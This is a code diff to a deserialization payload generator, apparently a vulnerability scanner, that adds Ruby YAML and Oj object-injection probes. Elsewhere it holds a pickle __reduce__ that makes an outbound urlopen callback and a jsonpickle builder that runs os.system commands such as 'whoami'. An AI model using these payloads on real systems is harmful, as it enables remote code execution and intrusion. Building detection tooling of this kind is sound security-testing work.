@@ -85,6 +85,8 @@ class PayloadMutation:
             return self._mutate_nodejs()
         if self.probe == "ruby_marshal":
             return self._mutate_ruby()
+        if self.probe == "oj_object":
+            return self._mutate_oj()
         if self.probe in ("viewstate", "dotnet_deser"):
             return self._mutate_dotnet_viewstate()
         if self.probe == "jsonnet":
@@ -473,11 +475,6 @@ class PayloadMutation:
         "unlink"
     }
 
-    # Blind phpggc gadgets: the embedded command never echoes into the
-    # response (black-box oracle only sees status + body diff), so id/whoami/
-    # hostname would produce identical 500s — 3x the subprocess+replay cost for
-    # zero extra signal. One canary command is enough. (PHP-only; the shared
-    # TEST_COMMANDS still drives Java/Pickle/etc.)
     PHP_TEST_COMMANDS = ["whoami"]
     
     
@@ -754,8 +751,6 @@ class PayloadMutation:
             self.url = url
 
         def __reduce__(self):
-            # urllib.request.urlopen — a pure-Python outbound GET, so no curl/wget needs
-            # to exist on the target for the blind callback to fire.
             return (urllib.request.urlopen, (self.url,))
 
     def _mutate_pickle(self) -> Mutations:
@@ -774,8 +769,6 @@ class PayloadMutation:
     JSONPICKLE_TEST_COMMANDS = TEST_COMMANDS
 
     def _jsonpickle_reduce(self, func: str, arg: str) -> str:
-        # jsonpickle's py/reduce = [callable, args]: on decode() it calls callable(*args).
-        # Verified against the live sink: os.system('id') runs, urllib.urlopen() calls out.
         import json as _json
         return _json.dumps({"py/reduce": [{"py/function": func}, {"py/tuple": [arg]}]})
 
@@ -834,6 +827,8 @@ class PayloadMutation:
     def _mutate_yaml(self) -> Mutations:
         if "java" in self.etype.lower():
             return self._mutate_yaml_java()
+        if "ruby" in self.etype.lower():
+            return self._mutate_yaml_ruby()
         return self._mutate_yaml_python()
 
     def _mutate_yaml_python(self) -> Mutations:
@@ -903,6 +898,28 @@ class PayloadMutation:
         payload["note"] = note
         return [payload]
 
+    def _mutate_yaml_ruby(self) -> Mutations:
+        """Ruby Psych object injection — !ruby/object:OpenStruct with a marker ivar. Valid for
+        YAML.unsafe_load()/Psych object mode; produces an echoed #<OpenStruct cmd=...> so the
+        oracle sees a behavioral change. A real RCE needs a version-specific Ruby/Gem gadget, so
+        per project policy (detect, don't fabricate a non-firing gadget) we stop at object injection."""
+        results: Mutations = []
+        for cmd in self.YAML_TEST_COMMANDS:
+            raw = (
+                "--- !ruby/object:OpenStruct\n"
+                "table:\n"
+                f"  :cmd: {cmd}\n"
+            )
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("yaml_ruby_object", "ruby/object:OpenStruct", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                "Requires YAML.unsafe_load()/Psych object mode; rebuilds an OpenStruct — "
+                "replace with a version-specific Ruby/Gem gadget for RCE"
+            )
+            results.append(payload)
+        return results
+
 
     NODEJS_TEST_COMMANDS = TEST_COMMANDS
 
@@ -964,6 +981,28 @@ class PayloadMutation:
             payload["note"] = "Generic Marshal object — replace with a real gadget chain for the target Ruby framework"
             results.append(payload)
 
+        return results
+
+    OJ_TEST_COMMANDS = TEST_COMMANDS
+
+    def _mutate_oj(self) -> Mutations:
+        """Oj.load(mode: :object) sink — emit Oj object-mode JSON (^o key) that rebuilds an
+        object with a marker ivar. This is the format the Oj sink actually parses; binary
+        Marshal would just raise a parse error -> 500 (which the control probe downgrades).
+        A real RCE needs a version-specific Oj/Gem gadget, so per project policy we stop at
+        object injection rather than fabricate a non-firing gadget."""
+        import json as _json
+        results: Mutations = []
+        for cmd in self.OJ_TEST_COMMANDS:
+            raw = _json.dumps({"^o": "Object", "@cmd": cmd})
+            b64 = base64.b64encode(raw.encode()).decode()
+            payload = self._make_payload("oj_object", "Oj ^o Object injection", cmd, b64)
+            payload["payload_raw"] = raw
+            payload["note"] = (
+                "Oj.load(mode: :object) rebuilds {^o:Object,@cmd}; valid Oj object-mode JSON "
+                "(not Marshal) — replace with a version-specific Oj/Gem gadget for RCE"
+            )
+            results.append(payload)
         return results
 
 
